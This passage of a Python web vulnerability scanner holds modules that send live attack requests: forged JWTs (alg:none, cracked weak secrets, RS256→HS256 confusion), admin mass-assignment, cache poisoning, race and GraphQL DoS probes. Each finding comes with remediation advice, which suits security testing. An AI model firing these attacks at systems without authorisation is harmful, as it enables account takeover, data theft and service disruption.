            pr = await client.get(target, headers={header: poison_value}, timeout=8)
            body = pr.text

            # Canary must appear in response AND not be in the clean baseline
            if canary not in body or canary in clean_body:
                continue

            # Step 2: Send a CLEAN request (no poison header) and check for HIT
            await asyncio.sleep(0.3)  # Let cache store the poisoned response
            cr = await client.get(target, timeout=8)
            cache_status = (cr.headers.get("x-cache", "")
                            or cr.headers.get("cf-cache-status", "")
                            or cr.headers.get("x-drupal-cache", "")
                            or cr.headers.get("x-varnish", "")).lower()
            second_body = cr.text

            # Confirmed: canary survives in the non-poisoned response (cached)
            if canary in second_body:
                yield _finding("cache", f"cache_poison_confirmed_{header.lower()}", "critical",
                    f"Cache Poisoning Confirmed via {header}",
                    f"Unique canary `{canary}` injected via `{header}: {poison_value}` appeared "
                    f"in the response — and PERSISTED in a subsequent clean request, confirming "
                    f"the poisoned response was cached and served to all users.",
                    f"Poison header: {header}: {poison_value}\n"
                    f"Canary: {canary}\n"
                    f"Confirmed in subsequent clean response: yes\n"
                    f"Cache headers on poisoned response: {pr.headers.get('cache-control', 'none')}",
                    target, True,
                    f"Add `{header}` to your cache key configuration. "
                    f"Strip unrecognised/untrusted headers at the CDN/proxy layer. "
                    f"Validate Host header before using in response generation.",
                    confidence="high")
                return
            elif "hit" in cache_status and canary in body:
                # Header reflected + cache HIT signal — likely but not fully confirmed
                yield _finding("cache", f"cache_poison_likely_{header.lower()}", "high",
                    f"Likely Cache Poisoning via {header}",
                    f"Canary `{canary}` reflected via `{header}` AND cache shows HIT — "
                    f"header value likely stored in cached response. "
                    f"Full exploitation requires testing from a separate IP/session.",
                    f"Poison header: {header}: {poison_value}\n"
                    f"Canary in response: yes\nCache-Status: {cache_status}",
                    target, True,
                    f"Add `{header}` to your CDN cache key. Strip unkeyed headers before caching.",
                    confidence="medium")
                return

        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)


# ── Module: Race Conditions ───────────────────────────────────────────────────

async def _module_race(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
    """
    Race condition detection with idempotency baseline to eliminate false positives.
    Strategy:
    1. First send 3 sequential requests to establish idempotency baseline
    2. Only flag if sequential requests DON'T all succeed (endpoint has limits)
    3. Then send 10 parallel requests — only flag if MORE succeed than sequential allows
    """
    race_targets = []
    for path in RACE_CONDITION_ENDPOINTS:
        url = target + path
        try:
            r = await client.head(url, timeout=5)
            if r.status_code not in (404, 405, 501):
                race_targets.append(url)
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

    for url in race_targets[:3]:
        # ── Idempotency baseline: 3 sequential POSTs ─────────────────────────
        sequential_ok = 0
        for _ in range(3):
            try:
                sr = await client.post(url, json={}, timeout=8)
                if sr.status_code in (200, 201):
                    sequential_ok += 1
            except Exception:
                pass
            await asyncio.sleep(0.1)

        # If ALL 3 sequential requests succeed, endpoint is idempotent — not a race condition
        if sequential_ok >= 3:
            continue  # Endpoint accepts all requests sequentially — skip

        # Endpoint rejected at least 1 sequential request — has some limiting logic
        # Now test: do parallel requests bypass that limit?
        async def _req():
            try:
                return await client.post(url, json={}, timeout=8)
            except Exception:
                return None

        responses = await asyncio.gather(*[_req() for _ in range(10)])
        ok_responses = [r for r in responses if r and r.status_code in (200, 201)]

        # Flag only if parallel gets MORE successes than sequential allowed
        if len(ok_responses) > max(sequential_ok, 1):
            yield _finding("race", "race_condition_bypass", "high",
                f"Race Condition — Limit Bypass at {urlparse(url).path}",
                f"Sequential requests: {sequential_ok}/3 succeeded. "
                f"Parallel requests (10 simultaneous): {len(ok_responses)}/10 succeeded. "
                f"The server applies rate/count limiting sequentially but not atomically. "
                f"Attackers can bypass limits via concurrent requests.",
                f"URL: {url}\nSequential success rate: {sequential_ok}/3\n"
                f"Parallel success rate: {len(ok_responses)}/10",
                url, True,
                "Use database-level atomic operations (SELECT FOR UPDATE, Redis SETNX). "
                "Implement idempotency keys. Use distributed locking for state changes.",
                confidence="high")


# ── Module: Business Logic ────────────────────────────────────────────────────

async def _module_business(target: str, client: httpx.AsyncClient,
                            forms: list[dict]) -> AsyncGenerator[dict, None]:
    # Negative price / quantity test via API
    api_cart = [f"{target}/api/cart", f"{target}/api/checkout",
                f"{target}/api/order", f"{target}/cart", f"{target}/checkout"]

    for url in api_cart:
        for test in BUSINESS_LOGIC_TESTS[:4]:
            try:
                payload = {test["field"]: test["value"]}
                r = await client.post(url, json=payload, timeout=8)
                if r.status_code in (200, 201):
                    try:
                        data = r.json()
                        if isinstance(data, dict):
                            price = data.get("total") or data.get("price") or data.get("amount")
                            if price is not None and float(price) <= 0:
                                yield _finding("business", "negative_price", "critical",
                                    f"Business Logic Flaw — Negative {test['field'].title()}",
                                    f"Setting {test['field']}={test['value']} resulted in "
                                    f"negative/zero total ({price}). Attacker may receive credits.",
                                    f"URL: {url}\nPayload: {payload}\nTotal: {price}",
                                    url, True,
                                    f"Server-side validate {test['field']} is positive. "
                                    f"Never trust client-supplied price/quantity.",
                                    confidence="high")
                    except Exception:
                        pass
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

    # Price parameter in forms
    for form in forms[:5]:
        if "price" in form.get("inputs", []) or "amount" in form.get("inputs", []):
            for field in ["price", "amount", "total"]:
                if field in form["inputs"]:
                    form_data = {inp: "0.01" if inp == field else "test"
                                 for inp in form["inputs"]}
                    try:
                        r = await client.post(form["action"], data=form_data, timeout=8)
                        if r.status_code in (200, 201, 302):
                            yield _finding("business", "price_tampering_form", "high",
                                f"Price Parameter Tampering in Form",
                                f"Form at {form['action']} contains a `{field}` input. "
                                f"Server may trust client-supplied price.",
                                f"Form: {form['action']}\nField: {field}=0.01\n"
                                f"Status: {r.status_code}",
                                form["action"], True,
                                "Never trust client-supplied price/quantity. "
                                "Always calculate totals server-side from the product catalog.",
                                confidence="medium")
                    except httpx.HTTPError:
                        pass

    # Test negative quantity in basket (Juice Shop Payback Time challenge)
    basket_endpoints = ["/api/BasketItems", "/api/basket", "/api/Baskets/1/Products", "/rest/basket"]
    for path in basket_endpoints[:3]:
        url = target + path
        try:
            # Try adding item with negative quantity
            r = await client.post(url, json={"ProductId": 1, "BasketId": 1, "quantity": -100}, timeout=8)
            if r.status_code in (200, 201):
                try:
                    data = r.json()
                    # Check if the order total becomes negative
                    if "quantity" in str(data) or "BasketItem" in str(data):
                        yield _finding("business", "negative_quantity_basket", "high",
                            "Business Logic — Negative Quantity Accepted (Payback Attack)",
                            f"POST {url} accepted quantity=-100. If this applies to checkout, "
                            f"the order total becomes negative and the store owes the attacker money.",
                            f"URL: {url}\nPayload: {{ProductId: 1, quantity: -100}}\nResponse: {str(data)[:200]}",
                            url, True,
                            "Validate quantity on server-side: reject values <= 0. "
                            "Apply business rule checks before processing payment.",
                            confidence="medium")
                except Exception:
                    pass
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

    # Test zero-star feedback (Juice Shop Zero Stars challenge)
    feedback_url = target + "/api/Feedbacks"
    try:
        r = await client.post(feedback_url, json={"comment": "Zero star test", "rating": 0}, timeout=8)
        if r.status_code in (200, 201):
            yield _finding("business", "zero_star_feedback", "low",
                "Zero-Star Feedback Accepted — Input Validation Bypass",
                "POST /api/Feedbacks with rating=0 succeeded. Client-side validation (1-5 stars) "
                "is bypassable — server does not validate minimum rating.",
                f"URL: {feedback_url}\nPayload: {{rating: 0}}\nStatus: {r.status_code}",
                feedback_url, True,
                "Validate rating range server-side (1 <= rating <= 5). Never trust client-side validation alone.",
                confidence="high")
    except httpx.HTTPError:
        pass

    # Test admin registration via mass assignment (Admin Registration challenge)
    register_url = target + "/api/Users"
    try:
        r = await client.post(register_url, json={
            "email": f"attacker_{uuid.uuid4().hex[:6]}@evil.com",
            "password": "Test1234!",
            "passwordRepeat": "Test1234!",
            "role": "admin"
        }, timeout=8)
        if r.status_code in (200, 201):
            try:
                data = r.json()
                if data.get("data", {}).get("role") == "admin" or "admin" in str(data).lower():
                    yield _finding("business", "admin_registration_mass_assignment", "critical",
                        "Mass Assignment — Admin Registration via role Field",
                        "POST /api/Users with `role: 'admin'` created an admin account. "
                        "The server does not filter or ignore privileged fields in registration.",
                        f"URL: {register_url}\nPayload includes role: 'admin'\nResponse: {str(data)[:300]}",
                        register_url, True,
                        "Use a DTO/allowlist — only accept expected fields (email, password). "
                        "Explicitly exclude role, isAdmin, and privilege fields from user registration.",
                        confidence="high")
            except Exception:
                pass
    except httpx.HTTPError:
        pass


# ── Module: GraphQL ───────────────────────────────────────────────────────────

async def _module_graphql(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
    gql_url: str | None = None

    for path in GRAPHQL_PATHS:
        url = target + path
        yield _probe("graphql", "POST", url, note="GraphQL endpoint discovery + introspection")
        try:
            r = await client.post(url, content=GRAPHQL_INTROSPECTION,
                                  headers={"Content-Type": "application/json"}, timeout=8)
            yield _probe("graphql", "POST", url, status=r.status_code, size=len(r.content))
            if r.status_code == 200:
                try:
                    data = r.json()
                    if "__schema" in str(data) or "types" in str(data.get("data", {})):
                        gql_url = url
                        yield _finding("graphql", "introspection_enabled", "high",
                            f"GraphQL Introspection Enabled at {path}",
                            "Full schema is exposed via introspection. Attackers can enumerate "
                            "all types, fields, queries, mutations, subscriptions and their arguments. "
                            "This provides the complete attack surface map for the GraphQL API.",
                            f"Endpoint: {url}\nTypes found: {str(data)[:300]}",
                            url, True,
                            "Disable introspection in production (`introspection: false` in server config). "
                            "Implement query depth limiting, complexity analysis, and persisted queries.",
                            confidence="high")

                    # ── Batch query abuse ─────────────────────────────────────
                    yield _probe("graphql", "POST", url, note="batch query abuse test")
                    rb = await client.post(url, content=GRAPHQL_BATCH,
                                           headers={"Content-Type": "application/json"}, timeout=8)
                    yield _probe("graphql", "POST", url, status=rb.status_code, size=len(rb.content))
                    if rb.status_code == 200 and isinstance(rb.json(), list) and len(rb.json()) > 1:
                        yield _finding("graphql", "batch_queries", "medium",
                            "GraphQL Batch Queries Enabled — Rate Limit Bypass Vector",
                            "Server accepts batched query arrays. An attacker can send 1000 queries "
                            "in a single HTTP request, bypassing per-request rate limits for "
                            "brute-force, OTP enumeration, or resource exhaustion attacks.",
                            f"Batch response: {rb.text[:200]}", url, True,
                            "Disable query batching or limit batch size to ≤5. "
                            "Implement per-user query rate limiting at the resolver level.",
                            confidence="high")

                    # ── Unauthenticated data access ───────────────────────────
                    for query in GRAPHQL_AUTH_BYPASS_QUERIES:
                        rq = await client.post(url, content=query,
                                               headers={"Content-Type": "application/json"},
                                               timeout=8)
                        if rq.status_code == 200:
                            qdata = rq.json().get("data", {})
                            if qdata and not rq.json().get("errors"):
                                yield _finding("graphql", "unauth_data_access", "critical",
                                    "Unauthenticated GraphQL Data Access",
                                    f"Query returned user data without authentication: {query[:80]}",
                                    f"Response: {rq.text[:300]}", url, True,
                                    "Implement authentication checks on all sensitive GraphQL resolvers.",
                                    confidence="high")
                                break

                    # ── Field suggestion / typo disclosure ────────────────────
                    # Even with introspection disabled, some servers return "Did you mean X?"
                    # suggestions that leak field names
                    typo_query = json.dumps({"query": "{ usr { nam } }"}).encode()
                    yield _probe("graphql", "POST", url, payload="{ usr { nam } }",
                                 note="field suggestion disclosure (typo query)")
                    try:
                        r_typo = await client.post(url, content=typo_query,
                                                    headers={"Content-Type": "application/json"},
                                                    timeout=8)
                        yield _probe("graphql", "POST", url, status=r_typo.status_code,
                                     size=len(r_typo.content))
                        body_typo = r_typo.text.lower()
                        if "did you mean" in body_typo or "suggestions" in body_typo:
                            yield _finding("graphql", "field_suggestion_disclosure", "medium",
                                "GraphQL Field Suggestion Leaks Schema Even Without Introspection",
                                "The GraphQL server returns 'Did you mean X?' suggestions for "
                                "typos, revealing real field/type names even when introspection "
                                "is disabled. An attacker can enumerate the full schema by "
                                "systematically sending invalid field names and observing suggestions.",
                                f"Typo query: `{{ usr {{ nam }} }}`\n"
                                f"Response contains suggestion: {r_typo.text[:300]}",
                                url, True,
                                "Disable field suggestions in production (`suggestions: false`). "
                                "In Apollo Server: `new ApolloServer({ introspection: false })` "
                                "also disables suggestions. For GraphQL Yoga, set `maskedErrors`.",
                                confidence="high")
                    except (httpx.HTTPError, Exception):
                        pass

                    # ── Query depth / complexity DoS ──────────────────────────
                    # A deeply nested query forces recursive resolver calls
                    deep_query = json.dumps({
                        "query": "{ " + "user { " * 10 + "id name email" + " }" * 10 + " }"
                    }).encode()
                    yield _probe("graphql", "POST", url, payload="deeply nested query (depth=10)",
                                 note="query depth DoS test")
                    t_deep_start = time.monotonic()
                    try:
                        r_deep = await client.post(url, content=deep_query,
                                                    headers={"Content-Type": "application/json"},
                                                    timeout=15)
                        t_deep = time.monotonic() - t_deep_start
                        yield _probe("graphql", "POST", url, status=r_deep.status_code,
                                     note=f"depth=10 elapsed: {t_deep:.2f}s")
                        if r_deep.status_code == 200 and t_deep > 2.0:
                            yield _finding("graphql", "query_depth_dos", "high",
                                "GraphQL No Query Depth Limit — DoS via Deeply Nested Queries",
                                f"A query nested 10 levels deep took {t_deep:.1f}s to process. "
                                f"Without depth limits, attackers can send queries nested "
                                f"hundreds of levels deep, causing exponential resource consumption "
                                f"and server-side DoS.",
                                f"Depth-10 query: {t_deep:.2f}s elapsed\nEndpoint: {url}",
                                url, True,
                                "Implement query depth limiting (max depth 5-7 for most APIs). "
                                "Also implement query complexity analysis to cap total resolver calls.",
                                confidence="medium")
                    except (httpx.HTTPError, asyncio.TimeoutError):
                        pass

                    # ── Alias-based DoS (batching without array) ──────────────
                    alias_batch = json.dumps({
                        "query": " ".join(
                            f"a{i}: __typename" for i in range(50)
                        )
                    }).encode()
                    yield _probe("graphql", "POST", url, payload="50-alias query",
                                 note="alias batching DoS test")
                    try:
                        r_alias = await client.post(url, content=alias_batch,
                                                     headers={"Content-Type": "application/json"},
                                                     timeout=10)
                        yield _probe("graphql", "POST", url, status=r_alias.status_code,
                                     size=len(r_alias.content))
                        if r_alias.status_code == 200 and len(r_alias.content) > 200:
                            yield _finding("graphql", "alias_batching_no_limit", "medium",
                                "GraphQL Alias Batching Without Limits — DoS / Rate Limit Bypass",
                                "The server processed 50 aliased queries in a single request. "
                                "Alias batching sidesteps array-based batch protection: the query "
                                "looks like a single query but executes N resolvers.",
                                f"50-alias query processed: {r_alias.status_code} "
                                f"({len(r_alias.content)}b)\nEndpoint: {url}",
                                url, True,
                                "Implement query complexity analysis that counts aliases. "
                                "Reject queries above a complexity threshold (e.g., 1000 complexity units).",
                                confidence="medium")
                    except (httpx.HTTPError, Exception):
                        pass

                    return
                except Exception:
                    pass
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)


# ── Module: JWT ───────────────────────────────────────────────────────────────

def _b64d(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


async def _module_jwt(target: str, client: httpx.AsyncClient,
                      auth_headers: dict[str, str]) -> AsyncGenerator[dict, None]:
    token = None
    for k, v in auth_headers.items():
        if k.lower() == "authorization" and v.lower().startswith("bearer "):
            token = v[7:]
            break

    if not token:
        yield _finding("jwt", "no_jwt_provided", "info",
            "No JWT Token Provided",
            "Supply an Authorization: Bearer <token> header to enable JWT analysis.",
            "", target, False, "Provide JWT in auth_headers for JWT module to run.",
            confidence="high")
        return

    parts = token.split(".")
    if len(parts) != 3:
        return

    try:
        header_data = json.loads(_b64d(parts[0]))
        payload_data = json.loads(_b64d(parts[1]))
    except Exception:
        return

    # Info: report claims
    sensitive = {k: v for k, v in payload_data.items()
                 if k in ("sub", "email", "role", "admin", "is_admin",
                           "scope", "permissions", "iat", "exp")}
    yield _finding("jwt", "jwt_claims_info", "info",
        "JWT Claims Inventory",
        f"JWT contains: {list(payload_data.keys())}. Sensitive: {sensitive}",
        f"Header: {json.dumps(header_data)}\nClaims: {json.dumps(payload_data)}",
        target, False,
        "Minimize sensitive data in JWT payloads. Use opaque tokens for sensitive data.",
        confidence="high")

    # Check expiry
    exp = payload_data.get("exp")
    if exp and exp < time.time():
        yield _finding("jwt", "expired_jwt", "info",
            "JWT Token is Expired",
            f"Token expired at {datetime.fromtimestamp(exp).isoformat()}. "
            f"Server should reject this but may not.",
            f"exp: {exp}", target, False, "Verify expiry enforcement server-side.", confidence="low")

    # alg:none bypass
    none_header = base64.urlsafe_b64encode(
        json.dumps({"alg": "none", "typ": "JWT"}).encode()
    ).rstrip(b"=").decode()
    none_token = f"{none_header}.{parts[1]}."

    for path in ["/api/me", "/api/user", "/api/v1/auth/me", "/me", "/profile"]:
        try:
            # Baseline: same path with an obviously-invalid (garbage, not
            # alg:none) token. Without this, a path that returns 200 for
            # EVERYONE regardless of auth (a public page, a "please sign in"
            # screen over 30 bytes) would false-positive as a confirmed auth
            # bypass — found via a 2026-09-15 detection-quality audit. Only
            # flag when the endpoint demonstrably enforces auth normally
            # (baseline rejected) but the alg:none token specifically got
            # through (differential signal, not just "returned 200").
            baseline_r = await client.get(
                target + path, headers={"Authorization": "Bearer invalid.invalid.invalid"}, timeout=8,
            )
            if baseline_r.status_code in (200,):
                continue  # endpoint doesn't enforce auth at all here — alg:none proves nothing
            r = await client.get(target + path,
                                  headers={"Authorization": f"Bearer {none_token}"}, timeout=8)
            if r.status_code == 200 and len(r.text) > 30:
                yield _finding("jwt", "alg_none_bypass", "critical",
                    "JWT Algorithm 'none' Bypass — Auth Bypassed",
                    "Server accepts JWT tokens with alg:none (unsigned). "
                    "Full authentication bypass — any user can forge tokens.",
                    f"Unsigned token accepted at {target + path} (status {r.status_code}), while a "
                    f"garbage-token baseline request to the same path was rejected (status "
                    f"{baseline_r.status_code}) — confirms auth is normally enforced here.",
                    target + path, True,
                    "Reject tokens with alg:none. Maintain a server-side algorithm allowlist. "
                    "Use a well-tested JWT library.",
                    confidence="high", oracle="status-flip")
                break
        except httpx.HTTPError:
            pass

    alg = header_data.get("alg", "").upper()

    # Weak secret brute force
    if alg in ("HS256", "HS384", "HS512"):
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        try:
            expected = _b64d(parts[2])
        except Exception:
            return

        hash_fn = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
                   "HS512": hashlib.sha512}.get(alg, hashlib.sha256)

        for secret in JWT_WEAK_SECRETS:
            computed = hmac.new(secret.encode(), signing_input, hash_fn).digest()
            if hmac.compare_digest(computed, expected):
                yield _finding("jwt", "weak_jwt_secret", "critical",
                    f"JWT Signed with Weak Secret: '{secret}'",
                    f"JWT HMAC secret is a common weak value. "
                    f"Attacker can forge tokens for any user ID/role.",
                    f"Algorithm: {alg}\nCracked secret: {secret}",
                    target, True,
                    "Use a cryptographically random secret of ≥256 bits. "
                    "Rotate the secret immediately and invalidate all existing tokens.",
                    confidence="high")
                return

        # kid path traversal
        kid = header_data.get("kid", "")
        if kid:
            for kid_payload in JWT_KID_PAYLOADS[:2]:
                tampered_header = dict(header_data)
                tampered_header["kid"] = kid_payload
                new_header = base64.urlsafe_b64encode(
                    json.dumps(tampered_header).encode()
                ).rstrip(b"=").decode()
                # Use empty string as secret (matches /dev/null content)
                empty_sig = hmac.new(b"", f"{new_header}.{parts[1]}".encode(),
                                      hashlib.sha256).digest()
                new_sig = base64.urlsafe_b64encode(empty_sig).rstrip(b"=").decode()
                new_token = f"{new_header}.{parts[1]}.{new_sig}"
                for path in ["/api/me", "/api/user"]:
                    try:
                        r = await client.get(target + path,
                                              headers={"Authorization": f"Bearer {new_token}"},
                                              timeout=8)
                        if r.status_code == 200 and len(r.text) > 30:
                            yield _finding("jwt", "kid_path_traversal", "critical",
                                "JWT 'kid' Path Traversal",
                                f"Server accepted JWT with kid={kid_payload}. "
                                f"Attacker can control the key used for signature verification.",
                                f"kid: {kid_payload}\nPath: {target + path}\nStatus: 200",
                                target + path, True,
                                "Validate kid values against an allowlist. "
                                "Never use kid values as file system paths.",
                                confidence="medium")
                    except httpx.HTTPError:
                        pass

    # RS256 → HS256 algorithm confusion + JKU/X5U SSRF injection
    if alg == "RS256":
        jwks_paths = ["/.well-known/jwks.json", "/api/.well-known/jwks.json",
                      "/oauth/jwks", "/jwks.json"]
        _pub_key_pem: bytes | None = None
        _jwks_url: str | None = None

        for jwks_path in jwks_paths:
            try:
                r_jwks = await client.get(target + jwks_path, timeout=6)
                if r_jwks.status_code == 200:
                    _jwks_url = target + jwks_path
                    try:
                        jwks = r_jwks.json()
                        keys = jwks.get("keys", [])
                        if keys:
                            yield _finding("jwt", "jwks_public_endpoint", "medium",
                                "JWKS Public Key Endpoint Exposed",
                                f"Server exposes public keys at `{jwks_path}`. "
                                f"This enables the RS256→HS256 algorithm confusion attack: "
                                f"an attacker who switches the JWT algorithm to HS256 and signs "
                                f"with the RSA public key (which is public knowledge) can forge "
                                f"valid tokens if the server doesn't pin the allowed algorithm.",
                                f"JWKS URL: {target + jwks_path}\nKeys: {len(keys)}\n"
                                f"Key types: {[k.get('kty') for k in keys[:3]]}",
                                target + jwks_path, False,
                                "Explicitly pin allowed algorithms in JWT verification (e.g., `algorithms=['RS256']`). "
                                "Never allow the `alg` header to determine which algorithm to use for verification.",
                                confidence="medium")
                            # Try RS256→HS256 confusion: sign with public key as HMAC secret
                            try:
                                from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
                                from cryptography.hazmat.backends import default_backend
                                import base64 as _b64jwt
                                k = keys[0]
                                if k.get("kty") == "RSA":
                                    n_bytes = _b64jwt.urlsafe_b64decode(k["n"] + "==")
                                    e_bytes = _b64jwt.urlsafe_b64decode(k["e"] + "==")
                                    n_int = int.from_bytes(n_bytes, "big")
                                    e_int = int.from_bytes(e_bytes, "big")
                                    pub_key = RSAPublicNumbers(e_int, n_int).public_key(default_backend())
                                    from cryptography.hazmat.primitives.serialization import (
                                        Encoding, PublicFormat
                                    )
                                    _pub_key_pem = pub_key.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)
                            except Exception:
                                pass
                    except Exception:
                        pass
                    break
            except httpx.HTTPError:
                continue
            await asyncio.sleep(0)

        # If we got the public key, attempt the RS256→HS256 confusion attack
        if _pub_key_pem:
            try:
                confused_header = base64.urlsafe_b64encode(
                    json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
                ).rstrip(b"=").decode()
                signing_input_conf = f"{confused_header}.{parts[1]}".encode()
                confused_sig = hmac.new(_pub_key_pem, signing_input_conf, hashlib.sha256).digest()
                confused_sig_b64 = base64.urlsafe_b64encode(confused_sig).rstrip(b"=").decode()
                confused_token = f"{confused_header}.{parts[1]}.{confused_sig_b64}"
                for path in ["/api/me", "/api/user", "/api/v1/auth/me", "/me", "/profile"]:
                    try:
                        # Baseline first, same discipline as the alg:none check above —
                        # without it, a path that returns 200 for everyone regardless
                        # of auth would false-positive as a confirmed algorithm-confusion
                        # bypass. Found via a 2026-09-15 audit: this check had no baseline
                        # at all despite the file's alg:none check (which this logic was
                        # clearly modeled on) already having been fixed to require one.
                        rc_baseline = await client.get(
                            target + path, headers={"Authorization": "Bearer invalid.invalid.invalid"}, timeout=8,
                        )
                        if rc_baseline.status_code == 200:
                            continue  # endpoint doesn't enforce auth here — proves nothing
                        r_conf = await client.get(
                            target + path,
                            headers={"Authorization": f"Bearer {confused_token}"},
                            timeout=8,
                        )
                        if r_conf.status_code == 200 and len(r_conf.text) > 30:
                            yield _finding("jwt", "rs256_hs256_confusion", "critical",
                                "JWT Algorithm Confusion — RS256 → HS256 Bypass",
                                f"The server accepted a JWT token where the algorithm was switched "
                                f"from RS256 to HS256 and the signature was computed using the "
                                f"RSA public key as the HMAC-SHA256 secret. "
                                f"This is the CVE-2016-5431 class of vulnerability: the server is "
                                f"using the supplied `alg` header to choose its verification logic, "
                                f"not an allowlist. Full authentication bypass is possible.",
                                f"Endpoint: {target + path}\nConfused algorithm: HS256\n"
                                f"Signed with: RSA public key from {_jwks_url}\n"
                                f"Response: {r_conf.status_code} ({len(r_conf.content)}b), while a "
                                f"garbage-token baseline to the same path was rejected (status "
                                f"{rc_baseline.status_code}).",
                                target + path, True,
                                "Pin the allowed algorithm explicitly in JWT verify calls "
                                "(e.g., PyJWT: `jwt.decode(token, key, algorithms=['RS256'])`). "
                                "Never trust the `alg` header from the client to select verification logic.",
                                confidence="high", oracle="status-flip")
                            break
                    except httpx.HTTPError:
                        pass
            except Exception:
                pass

        # JKU / X5U header injection (SSRF via JWT header)
        if alg == "RS256":
            attacker_jku = "https://attacker.example.com/.well-known/jwks.json"
            yield _probe("jwt", "GET", target + "/api/me",
                         payload=f"jku: {attacker_jku}",
                         note="JKU header injection — server would SSRF-fetch attacker JWKS (requires OOB)")
            yield _finding("jwt", "jku_injection_vector", "high",
                "JWT 'jku'/'x5u' Header Injection — SSRF Vector (Requires OOB Verification)",
                f"JWT tokens with `alg: RS256` are susceptible to `jku` (JWK Set URL) or `x5u` "
                f"(X.509 URL) header injection. If the server fetches the JWK Set from the URL "
                f"in the JWT header without validation, an attacker can point it to a self-hosted "
                f"JWKS and sign tokens with their own key. "
                f"Confirm with an out-of-band DNS/HTTP callback (Burp Collaborator).",
                f"Original JWT alg: {alg}\nVector: modify `jku` in header to attacker-controlled URL\n"
                f"Requires: out-of-band HTTP callback to confirm server fetches the URL",
                target, False,
                "Validate `jku` and `x5u` values against an explicit allowlist of trusted JWKS URLs. "
                "Reject any JWT whose `jku`/`x5u` does not match the server's registered key endpoint. "
                "Never fetch JWK Sets from URLs embedded in untrusted JWT headers.",
                confidence="medium")

    # Test expired token acceptance
    if exp and exp < time.time():
        for path in ["/api/me", "/api/user", "/api/v1/auth/me"]:
            try:
                r_exp = await client.get(target + path,
                    headers={"Authorization": f"Bearer {token}"}, timeout=8)
                if r_exp.status_code == 200 and len(r_exp.text) > 30:
                    yield _finding("jwt", "expired_token_accepted", "critical",
                        "Expired JWT Token Accepted — No Expiry Enforcement",
                        f"Server at {path} accepted an expired JWT (exp: {datetime.fromtimestamp(exp).isoformat()}). "
                        f"Authentication tokens never expire — revocation is impossible.",
                        f"Token exp: {exp} (past)\nEndpoint: {target + path}\nStatus: 200",
                        target + path, True,
                        "Enforce JWT expiry (`exp` claim) on every request. "
                        "Implement token refresh flows with short-lived access tokens.",
                        confidence="high")
                    break
            except httpx.HTTPError:
                pass

    # Test alg:none attack — forge JWT with algorithm set to none
    auth_header = client.headers.get("Authorization", "")
    if auth_header.startswith("Bearer "):
        token_for_none = auth_header[7:]
        parts_none = token_for_none.split(".")
        if len(parts_none) == 3:
            try:
                import base64 as _b64
                header_decoded = _b64.b64decode(parts_none[0] + "==").decode()
                header_obj = json.loads(header_decoded)
                original_alg = header_obj.get("alg", "HS256")

                for none_variant in JWT_ALG_NONE_VARIANTS[:4]:
                    forged_header = json.dumps({"typ": "JWT", "alg": none_variant}).encode()
                    forged_header_b64 = _b64.urlsafe_b64encode(forged_header).rstrip(b"=").decode()

                    # Keep original payload, empty signature
                    forged_token = f"{forged_header_b64}.{parts_none[1]}."

                    test_endpoints = ["/rest/user/whoami", "/api/me", "/api/user", "/api/Users"]
                    for ep in test_endpoints[:2]:
                        try:
                            r = await client.get(target + ep,
                                headers={"Authorization": f"Bearer {forged_token}"},
                                timeout=8)
                            if r.status_code == 200 and len(r.content) > 20:
                                try:
                                    data = r.json()
                                    if any(k in str(data) for k in ["email", "username", "id", "role"]):
                                        yield _finding("jwt", "jwt_alg_none",
                                            "critical",
                                            f"JWT Algorithm Confusion — alg:none Accepted",
                                            f"The server accepted a JWT with `alg:{none_variant}` (no signature). "
                                            f"Any user can forge tokens for any account without knowing the secret.",
                                            f"Original alg: {original_alg}\nForged alg: {none_variant}\n"
                                            f"Endpoint: {target + ep}\nResponse: {str(data)[:200]}",
                                            target + ep, True,
                                            "Explicitly whitelist allowed algorithms server-side (HS256, RS256). "
                                            "Reject tokens with alg:none. Use a JWT library that disallows none by default.",
                                            confidence="high")
                                        break
                                except Exception:
                                    pass
                        except httpx.HTTPError:
                            pass
                    await asyncio.sleep(0)
            except Exception:
                pass


# ── Module: Open Redirect ─────────────────────────────────────────────────────

async def _module_redirect(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
    for param in REDIRECT_PARAMS[:10]:
        for payload in REDIRECT_PAYLOADS[:4]:
            test_url = f"{target}?{param}={payload}"
            try:
                r = await client.get(test_url, follow_redirects=False, timeout=8)
                loc = r.headers.get("location", "")
                if "evil.example.com" in loc or "javascript:" in loc:
                    yield _finding("redirect", "open_redirect", "high",
                        f"Open Redirect via '{param}' parameter",
                        f"Parameter `{param}` redirects to attacker-controlled URL `{payload}`. "
                        f"Can be chained with OAuth flows for account takeover.",
                        f"URL: {test_url}\nLocation: {loc}",
                        test_url, True,
                        "Validate redirect targets against an allowlist. "
                        "Reject absolute URLs or URLs with different origins.",
                        confidence="high")
                    return
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)


# ── Module: Auth Bypass ───────────────────────────────────────────────────────

async def _module_auth_bypass(target: str, client: httpx.AsyncClient,
                               spa_fallback_size: int = 0) -> AsyncGenerator[dict, None]:
    # ── Sensitive file exposure (SPA-aware) ───────────────────────────────────
    for path in COMMON_SENSITIVE_PATHS[:20]:
        url = target + path
        yield _probe("auth_bypass", "GET", url, note=f"checking sensitive path: {path}")
        try:
            r = await client.get(url, timeout=6)
            yield _probe("auth_bypass", "GET", url, status=r.status_code, size=len(r.content))
            # Skip if this is the SPA returning its index.html for all routes
            if _is_spa_fallback(r, spa_fallback_size):
                continue
            if r.status_code == 200 and len(r.text) > 50:
                # Verify the content actually looks like a sensitive file
                # not just a generic application response
                body = r.text
                ct = r.headers.get("content-type", "")
                is_html = "text/html" in ct

                # If response is HTML and not a known non-SPA format, skip
                if is_html and not any(kw in body.lower() for kw in
                                        ["<?php", "[core]", "[remote", "DB_PASSWORD",
                                         "app_key", "secret_key", "api_key", "password="]):
                    continue

